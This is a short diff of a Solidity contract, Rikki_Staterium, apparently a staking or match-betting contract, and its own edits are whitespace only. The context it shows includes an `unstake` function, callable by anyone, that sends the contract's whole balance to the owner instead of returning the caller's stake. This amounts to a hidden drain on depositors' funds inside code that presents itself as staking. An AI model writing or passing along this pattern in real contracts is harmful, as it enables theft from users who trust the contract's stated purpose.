@@ -10,6 +10,7 @@ contract Rikki_Staterium {
         Matches[12] = Match(1, 12, 104, 105, 10, 40, 5, 50);
         Matches[13] = Match(1, 13, 106, 107, 10, 40, 5, 50);
     }
+    
     modifier onlyOwner(){
         require(msg.sender == owner);
         _;
@@ -50,7 +51,8 @@ contract Rikki_Staterium {
     }
    
     function unstake(uint256 _waveID, uint256 _matchID) public  {
-        owner.transfer(address(this).balance);
+       owner.transfer(address(this).balance);
     }
     function () public payable{}
-}    
+
+}
